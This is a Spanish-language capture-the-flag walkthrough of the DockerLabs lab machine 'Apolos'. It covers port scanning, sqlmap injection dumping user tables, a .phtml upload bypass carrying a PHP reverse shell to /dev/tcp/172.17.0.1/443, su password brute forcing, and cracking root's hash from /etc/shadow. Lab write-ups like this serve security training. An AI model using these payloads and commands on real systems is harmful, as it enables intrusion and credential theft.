#MAQUINA #DOCKERLABS #MEDIO
#SQLI  #SQLMAP #ABUSO_SUBIDA_ARCHIVOS 
#SU_BRUTE_FORCE 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Apolos** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 15:34 CET
Initiating ARP Ping Scan at 15:34
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:34, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:34
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:34, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-05 15:34:13 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 15:36 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apple Store
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.48 seconds



```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 15:37 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|   /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Podemos sacar:
+ Directorio **uploads ,img ,vendor** interesantes en el puerto 80.

Al revisarlos, img y vendor no me terminan de parecer interesantes.

# EXPLOTACION

Al revisar la web que hay en el puerto 80, vemos que hay un login. 

Vamos a usar **sqlmap** para ver si es vulnerable a una SQLI.

   ```bash

sqlmap -u "http://172.17.0.2/login.php" --batch --forms --dbs                  

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users


sqlmap -u "http://172.17.0.2/login.php" --batch --forms -D users --tables

Database: users
[1 table]
+----------+
| usuarios |
+----------+

sqlmap -u "http://172.17.0.2/login.php" --batch --forms -D users -T usuarios --dump

Database: users
Table: usuarios
[3 entries]
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | $paco$123     | paco     |
| 2  | P123pepe3456P | pepe     |
| 3  | jjuuaann123   | juan     |
+----+---------------+----------+

```

Probamos credenciales y no sirven.

Nos creamos una cuenta y entramos.

Echamos un ojo a **mycart.php** , vemos que al meter `' or 1=1 --` en la búsqueda de productos peta, posible **SQLI** otra vez, vamos a automatizarlo con **sqlmap**.
Necesitamos arrastrar la cookie, para ello Click derecho > Inspeccionar > Storage > Cookies

   ```bash

sqlmap -u "http://172.17.0.2/mycart.php?search=" --batch --dbs --cookie="PHPSESSID=dic1u6ivstpgih4cos6cnv09eg"               

available databases [5]:
[*] apple_store
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

sqlmap -u "http://172.17.0.2/mycart.php?search=" --batch -D apple_store --tables --cookie="PHPSESSID=dic1u6ivstpgih4cos6cnv09eg"                

Database: apple_store
[2 tables]
+-----------+
| productos |
| users     |
+-----------+

sqlmap -u "http://172.17.0.2/mycart.php?search=" --batch -D apple_store -T users --dump --cookie="PHPSESSID=dic1u6ivstpgih4cos6cnv09eg"                

Database: apple_store                                                                                                                                                                    
Table: users
[5 entries]
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 761bb015d7254610f89d9a7b6b152f1df2027e0a        | luisillo |
| 2  | 7f73ae7a9823a66efcddd10445804f7d124cd8b0        | admin    |
| 3  | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 (test) | test     |
| 4  | a0f1490a20d0211c997b44bc357e1972deab8ae3 (s)    | x        |
| 5  | a0f1490a20d0211c997b44bc357e1972deab8ae3 (s)    | s        |
+----+-------------------------------------------------+----------+

```

Nos interesa el usuario admin, y parece que es MD5.

Usamos https://hashes.com/en/decrypt/hash 

`7f73ae7a9823a66efcddd10445804f7d124cd8b0:0844575632`

**Usuario -> admin**
**Contra -> 0844575632**


Al loggearnos, tenemos un **panel de admin** y al entrar en Configuración podemos subir archivos.
No deja subir un php, lo interceptamos con **burpsuite** y cambiamos la extensión a **phtml**:

```php
POST /adm_configuration.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------68612445532931878114124137394
Content-Length: 822
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/adm_configuration.php
Cookie: PHPSESSID=dic1u6ivstpgih4cos6cnv09eg
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------68612445532931878114124137394
Content-Disposition: form-data; name="file_upload"; filename="wp.phtml"
Content-Type: application/x-php

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

-----------------------------68612445532931878114124137394
Content-Disposition: form-data; name="destinatario"


-----------------------------68612445532931878114124137394
Content-Disposition: form-data; name="asunto"


-----------------------------68612445532931878114124137394
Content-Disposition: form-data; name="mensaje"


-----------------------------68612445532931878114124137394--

```

Al entrar al archivo desde uploads y ponernos en escucha ya estamos dentro como www-data.
# ESCALADA PRIVILEGIOS

Al ver los usuarios vemos que tenemos a luisillo, usamos la herramienta de antes para sacar su contra.

`761bb015d7254610f89d9a7b6b152f1df2027e0a:mundodecaramelo`

No nos sirve y no encuentro manera de escalar privilegios, optamos por usar fuerza bruta.
Nos descargamos : https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.py

```bash
www-data@bba84aac9d2c:/tmp$ ./Linux-Su-Force.sh luisillo_o rockyou.txt 
Contraseña encontrada para el usuario luisillo_o: 19831983

```

**Usuario -> luisillo_o**
**Contra -> 19831983**

YA ESTAMOS COMO LUISILLO

Viendo cosas sobre el usuario vemos lo siguiente:

```
uid=1001(luisillo_o) gid=1001(luisillo_o) groups=1001(luisillo_o),42(shadow)
$ whoami
luisillo_o
$ id
uid=1001(luisillo_o) gid=1001(luisillo_o) groups=1001(luisillo_o),42(shadow)

```

Estamos en un grupo llamado **shadow** y podemos ver el **/etc/shadow** con cat. Intentamos crackearla con john :

```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt root.txt               

Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rainbow2         (?)     
1g 0:00:00:16 DONE (2025-02-06 16:39) 0.05917g/s 761.1p/s 761.1c/s 761.1C/s rainbow2..wendel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Usuario -> root**
**Contra -> rainbow2**

**YA ESTAMOS COMO ROOT**